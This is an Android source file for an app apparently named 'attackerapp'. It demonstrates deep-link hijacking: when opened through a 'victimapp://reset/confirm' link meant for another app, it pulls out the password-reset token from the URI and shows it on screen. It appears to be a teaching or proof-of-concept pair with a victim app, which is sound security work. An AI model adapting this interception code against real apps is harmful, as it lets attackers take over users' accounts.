package com.example.attackerapp;

import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        TextView title = findViewById(R.id.textTitle);
        TextView subtitle = findViewById(R.id.textSubtitle);
        View card = findViewById(R.id.cardCaptured);
        TextView uriView = findViewById(R.id.textUri);
        TextView tokenView = findViewById(R.id.textToken);

        Uri data = getIntent().getData();
        if (data != null) {
            // Hijacked: this app was chosen for a victimapp://reset/confirm link that
            // was meant for VictimApp, so it can read the full URI and the token.
            title.setText(R.string.hacked_title);
            subtitle.setText(R.string.hacked_subtitle);
            uriView.setText(data.toString());
            String token = data.getQueryParameter("token");
            tokenView.setText(token != null ? token : getString(R.string.no_token));
            card.setVisibility(View.VISIBLE);
        } else {
            // Opened from the launcher: nothing captured yet.
            title.setText(R.string.attacker_idle_title);
            subtitle.setText(R.string.attacker_idle_subtitle);
            card.setVisibility(View.GONE);
        }
    }
}
